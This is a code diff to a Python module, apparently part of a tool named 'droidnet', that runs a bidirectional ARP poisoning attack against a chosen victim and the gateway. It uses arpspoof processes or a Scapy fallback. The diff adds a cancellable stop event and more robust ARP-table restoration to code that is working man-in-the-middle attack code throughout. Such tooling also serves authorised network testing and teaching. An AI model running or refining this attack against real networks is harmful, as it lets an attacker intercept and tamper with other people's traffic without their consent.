@@ -26,6 +26,7 @@ import shutil
 import subprocess
 import sys
 import time
+from threading import Event
 
 from rich import print as rprint
 
@@ -33,9 +34,9 @@ from droidnet.platform.utils import check_root, get_default_iface
 
 # Scapy is optional — only used if arpspoof is missing.
 try:
-    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf as _scapy_conf
+    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr
     _SCAPY_OK = True
-except ImportError:
+except (ImportError, OSError):
     _SCAPY_OK = False
 
 
@@ -68,6 +69,7 @@ def _poison_scapy(
     gateway_ip: str,
     iface: str,
     interval: float = 2.0,
+    stop_event: Event | None = None,
 ) -> None:
     """
     ARP poisoning loop using Scapy.
@@ -76,6 +78,7 @@ def _poison_scapy(
     intervals of *interval* seconds, and upon exit sends a burst of
     replies with original MACs to repair both ARP tables.
     """
+    stop_event = stop_event or Event()
     rprint("[dim][·] Resolving victim and gateway MACs...[/dim]")
     target_mac  = _resolve_mac(target_ip,  iface)
     gateway_mac = _resolve_mac(gateway_ip, iface)
@@ -113,23 +116,27 @@ def _poison_scapy(
 
     sent = 0
     try:
-        while True:
+        while not stop_event.is_set():
             sendp(poison_target,  iface=iface, verbose=False)
             sendp(poison_gateway, iface=iface, verbose=False)
             sent += 2
             rprint(f"  [dim][→] Poisoned packets: {sent}[/dim]", end="\r")
-            time.sleep(interval)
+            stop_event.wait(interval)
     except KeyboardInterrupt:
-        rprint(f"\n[bold yellow][!][/bold yellow] Restoring ARP (5 bursts)...")
+        rprint("\n[bold yellow][!][/bold yellow] Restoring ARP (5 bursts)...")
     finally:
         for _ in range(5):
-            sendp(restore_target,  iface=iface, verbose=False)
-            sendp(restore_gateway, iface=iface, verbose=False)
+            for frame in (restore_target, restore_gateway):
+                try:
+                    sendp(frame, iface=iface, verbose=False)
+                except Exception as exc:
+                    rprint(f"[yellow]ARP restoration failed: {exc}[/yellow]")
             time.sleep(0.2)
-        rprint("[bold green][✓][/bold green] Clean. Victim regained internet.")
+        rprint("[dim]ARP response stopped; restoration attempted.[/dim]")
 
 
-def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
+def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0",
+           stop_event: Event | None = None) -> None:
     """
     Run a bidirectional ARP poisoning attack against *target_ip*.
 
@@ -144,50 +151,48 @@ def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
         gateway_ip : IP of the network gateway/router.
         iface      : Network interface to use (default: wlan0).
     """
+    stop_event = stop_event or Event()
+    if stop_event.is_set():
+        return
     if not _arpspoof_available():
         if _SCAPY_OK:
             rprint("[yellow][!][/yellow] arpspoof not found; using Scapy fallback.")
-            rprint(f"[bold red][☠][/bold red] Poisoning ARP (Scapy)...")
+            rprint("[bold red][☠][/bold red] Poisoning ARP (Scapy)...")
             rprint(f"  Victim : [cyan]{target_ip}[/cyan]")
             rprint(f"  Gateway : [cyan]{gateway_ip}[/cyan]")
             rprint(f"  Iface   : [cyan]{iface}[/cyan]")
-            _poison_scapy(target_ip, gateway_ip, iface)
+            _poison_scapy(target_ip, gateway_ip, iface, stop_event=stop_event)
             return
-        rprint("[bold red][✗] arpspoof not found and scapy not installed.[/bold red]")
+        rprint("[bold red][✗] arpspoof not found and Scapy unavailable. Check installation and socket permissions.[/bold red]")
         rprint("[dim]On Linux: sudo apt install dsniff  (or pip install scapy)[/dim]")
         rprint("[dim]On Termux: pip install scapy (Android usually blocks raw sockets)[/dim]")
         return
 
-    rprint(f"[bold red][☠][/bold red] Poisoning ARP...")
+    rprint("[bold red][☠][/bold red] Poisoning ARP...")
     rprint(f"  Victim : [cyan]{target_ip}[/cyan]")
     rprint(f"  Gateway : [cyan]{gateway_ip}[/cyan]")
     rprint(f"  Iface   : [cyan]{iface}[/cyan]")
-    rprint(f"  [dim]Ctrl+C to stop and restore.[/dim]\n")
+    rprint("  [dim]Ctrl+C to stop and restore.[/dim]\n")
 
-    proc1 = subprocess.Popen(
-        ["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-    proc2 = subprocess.Popen(
-        ["arpspoof", "-i", iface, "-t", gateway_ip, target_ip],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-
-    rprint(f"[bold green][✓][/bold green] Attack active (PIDs: {proc1.pid}, {proc2.pid})")
-
+    processes = []
     try:
+        for target, source in ((target_ip, gateway_ip), (gateway_ip, target_ip)):
+            if stop_event.is_set():
+                return
+            processes.append(subprocess.Popen(
+                ["arpspoof", "-i", iface, "-t", target, source],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            ))
         # Blocks until either arpspoof dies (or Ctrl+C).
         # If one falls, the attack is incomplete and we must stop the other.
-        while proc1.poll() is None and proc2.poll() is None:
-            time.sleep(0.5)
-        if proc1.poll() is not None or proc2.poll() is not None:
+        while all(p.poll() is None for p in processes) and not stop_event.wait(0.5):
+            pass
+        if any(p.poll() is not None for p in processes):
             rprint("[bold yellow][!][/bold yellow] An arpspoof process terminated. Cleaning up...")
     except KeyboardInterrupt:
-        rprint(f"\n[bold yellow][!][/bold yellow] Stopping and restoring network...")
+        rprint("\n[bold yellow][!][/bold yellow] Stopping and restoring network...")
     finally:
-        for p in (proc1, proc2):
+        for p in processes:
             if p.poll() is None:
                 p.terminate()
                 try:
@@ -195,7 +200,7 @@ def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
                 except subprocess.TimeoutExpired:
                     p.kill()
                     p.wait()
-        rprint("[bold green][✓][/bold green] Clean. Victim regained internet.")
+        rprint("[dim]ARP response processes stopped.[/dim]")
 
 
 if __name__ == "__main__":
